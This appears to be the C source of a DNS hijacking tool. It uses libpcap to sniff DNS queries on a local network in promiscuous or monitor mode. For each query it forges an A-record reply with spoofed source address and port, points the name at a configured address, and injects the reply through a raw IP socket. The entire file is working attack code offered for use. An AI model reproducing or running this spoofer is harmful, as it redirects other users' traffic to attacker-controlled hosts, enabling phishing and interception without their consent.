#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pcap.h>

#include "dns_hijack.h"
#include "header.h"
#include "dns.h"

int main(int argc, char *argv[])
{

	pcap_t *handle;
	pcap_if_t *all_dev, *dev;

	char err_buf[PCAP_ERRBUF_SIZE];
	char *dev_name;
	bpf_u_int32 net_ip, mask;

	//get all available devices
	if (pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(EXIT_FAILURE);
	}

	if (all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(EXIT_FAILURE);
	}

	printf("Available devices list: \n");
	int c = 1;

	for (dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);

		c++;
	}

	printf("Please choose the monitoring device (e.g., en0):\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end

	//look up the chosen device
	pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);

	struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[100];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("NET address: %s\n", ip_char);

	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("Mask: %s\n", ip_char);

	//Create the handle
	if (!(handle = pcap_create(dev_name, err_buf)))
	{
		fprintf(stderr, "Pcap create error : %s", err_buf);
		exit(EXIT_FAILURE);
	}

	//If the device can be set in monitor mode (WiFi), we set it.
	//Otherwise, promiscuous mode is set
	if (pcap_can_set_rfmon(handle) == 1)
	{
		if (pcap_set_rfmon(handle, 1))
			pcap_perror(handle, "Error while setting monitor mode");
	}

	if (pcap_set_promisc(handle, 1))
		pcap_perror(handle, "Error while setting promiscuous mode");

	//Setting immediate mode
	if (pcap_set_immediate_mode(handle, 1))
		pcap_perror(handle, "Pcap set immediate mode error");

	//Activating the sniffing handle
	if (pcap_activate(handle))
		pcap_perror(handle, "Pcap activate error");

	int *dlt_buf;
	int num = pcap_list_datalinks(handle, &dlt_buf);
	for (int i = 0; i < num; i++)
	{
		printf("%d - %s - %s \n", dlt_buf[i], pcap_datalink_val_to_name(dlt_buf[i]), pcap_datalink_val_to_description(dlt_buf[i]));
	}

	// the the link layer header type
	// see http://www.tcpdump.org/linktypes.html
	header_type = pcap_datalink(handle);

	char filter_exp[] = "udp && (dst port 53)"; /* Filter expression here */

	struct bpf_program fp; /* The compiled filter expression */

	if (pcap_compile(handle, &fp, filter_exp, 0, 0) == -1)
	{
		printf("Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}
	if (pcap_setfilter(handle, &fp) == -1)
	{
		printf("Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	if (handle == NULL)
	{
		printf("Unable to open device %s: %s\n", dev_name, err_buf);
		exit(EXIT_FAILURE);
	}

	printf("Device %s is opened. Begin sniffing with filter %s...\n", dev_name, filter_exp);
	printf("\n");

	//Put the device in sniff loop
	pcap_loop(handle, -1, process_packet, NULL);

	pcap_close(handle);

	return 0;
}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{
	printf("A packet is received! \n");
	int size = header->len;

	//Finding the beginning of IP header
	struct iphdr *in_iphr;

	u_int8_t *radiotap_header_length = (u_int8_t *)(buffer + 2);
	
	switch (header_type)
	{
	case LINKTYPE_ETH:
		in_iphr = (struct iphdr *)(buffer + sizeof(struct ethhdr)); //For ethernet
		size -= sizeof(struct ethhdr);
		break;

	case LINKTYPE_NULL:
		in_iphr = (struct iphdr *)(buffer + 4);
		size -= 4;
		break;

	case LINKTYPE_WIFI:
		in_iphr = (struct iphdr *)(buffer + 34 + *radiotap_header_length);
		size -= 55;
		break;

	case DLT_LINUX_SLL:
		in_iphr = (struct iphdr *)(buffer + 16);
		size -= 16;
		break;

	default:
		fprintf(stderr, "Unknown header type %d\n", header_type);
		exit(EXIT_FAILURE);
	}

	if (in_iphr->ihl != 5 || in_iphr->version != 4)
	{
		printf("Error parsing the packet");
		printf("Packet not processed");
		return;
	}

	//to keep the DNS information received.

	query q;
	bzero(&q, sizeof(query));

	//the UDP header
	struct udphdr *in_udphdr = (struct udphdr *)(in_iphr + 1);

	//the DNS header
	//	dns_header *dnsh = (dns_header*)(udph + 1);
	uint8_t *dns_buff = (uint8_t *)(in_udphdr + 1);

	//	parse the dns query
	int id = parse_dns_query_hijack(dns_buff, &q);

	/******************now build the reply using raw IP ************/
	uint8_t send_buf[BUF_SIZE]; //sending buffer
	bzero(send_buf, BUF_SIZE);

	u_int32_t source_ip = in_iphr->daddr;
	u_int32_t dest_ip = in_iphr->saddr;

	u_int16_t source_port = in_udphdr->dest;
	u_int16_t dest_port = in_udphdr->source;

	char *data = NULL;

	/**********dns header*************/
	dns_header *dnshdr = (dns_header *)(send_buf + sizeof(struct iphdr) + sizeof(struct udphdr));
	data = (char *)send_buf + sizeof(struct iphdr) + sizeof(struct udphdr);

	int dns_size = 0;

	build_dns_header(dnshdr, id, 1, 1, 1, 0, 0);
	u_int8_t *qname = NULL;

	qname = (uint8_t *)&send_buf[sizeof(dns_header) + sizeof(struct iphdr) + sizeof(struct udphdr)];

	int offset = 0;
	build_name_section(qname, (char *)q.qname, &offset);
	question *qdata = NULL;
	qdata = (question *)(qname + offset);

	qdata->qtype = htons(TYPE_A);
	qdata->qclass = htons(CLASS_IN);

	u_int8_t *name = NULL;
	name = (u_int8_t *)&send_buf[sizeof(dns_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(question) + strlen((char *)qname) + 1];

	offset = 0;
	build_name_section(name, (char *)q.qname, &offset);

	r_element *element = NULL;
	element = (r_element *)(name + offset);
	element->_class = htons(CLASS_IN);
	element->type = htons(TYPE_A);
	element->ttl = htonl(500);
	element->rdlength = htons(4);

	inet_pton(AF_INET, address_array, (char *)element + sizeof(r_element));

	dns_size = sizeof(dns_header) + offset + sizeof(r_element) + 4 + sizeof(question) + strlen((char *)qname) + 1;

	/*****************IP header************************/
	struct iphdr *out_iphdr = (struct iphdr *)send_buf;

	//fill the IP header here
	out_iphdr->version = 4;
	out_iphdr->ihl = 5;
	out_iphdr->tos = 0;
	out_iphdr->frag_off = 0;
	out_iphdr->ttl = 64;
	out_iphdr->protocol = 17;
	out_iphdr->check = 0;
	out_iphdr->saddr = source_ip;
	out_iphdr->daddr = dest_ip;
	out_iphdr->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + dns_size);
	out_iphdr->id = htons(1234);

	out_iphdr->check = checksum((unsigned short *)out_iphdr, sizeof(struct iphdr));

	/****************UDP header********************/
	struct udphdr *out_udphdr = (struct udphdr *)(send_buf + sizeof(struct iphdr));

	out_udphdr->source = source_port;
	out_udphdr->dest = dest_port;
	out_udphdr->len = htons(sizeof(struct udphdr) + dns_size);
	out_udphdr->check = 0;

	//fill the UDP pseudo header

	struct pseudo_udp_header psh; //pseudo header

	memset(&psh, 0, sizeof(struct pseudo_udp_header));

	psh.dest_address = dest_ip;
	psh.source_address = source_ip;
	psh.protocol = 17;
	psh.udp_length = htons(sizeof(struct udphdr) + dns_size);
	psh.placeholder = 0;

	//filling UDP header checksum

	char *checkstr;
	checkstr = malloc(sizeof(struct pseudo_udp_header) + sizeof(struct udphdr) + dns_size);

	memcpy(checkstr, (char *)&psh, sizeof(struct pseudo_udp_header));
	memcpy(checkstr + sizeof(struct pseudo_udp_header), (char *)out_udphdr, sizeof(struct udphdr));
	memcpy(checkstr + sizeof(struct pseudo_udp_header) + sizeof(struct udphdr), data, dns_size);

	out_udphdr->check = checksum((unsigned short *)checkstr, sizeof(struct pseudo_udp_header) + sizeof(struct udphdr) + dns_size);

	/************** send out using raw IP socket************/
	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	int hincl = 1; /* 1 = on, 0 = off */
	setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	if (fd < 0)
	{
		perror("Error creating raw socket ");
		exit(EXIT_FAILURE);
	}

	struct sockaddr_in to;
	memset(&to, '0', sizeof(struct sockaddr_in));
	to.sin_family = AF_INET;
	to.sin_addr.s_addr = dest_ip;
	to.sin_port = dest_port;

	int sizeofpacket = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_size;
	int n = sendto(fd, send_buf, sizeofpacket, 0, (struct sockaddr *)&to, sizeof(struct sockaddr));
	if (n < 0)
	{
		perror("Error sending the packet");
	}

	printf("Target : %s, \t",inet_ntoa(to.sin_addr));
	printf("Asked for : %s, \n",(char *)q.qname);

	printf("%d bytes sent successfully \n", n);
	printf("\n");
}
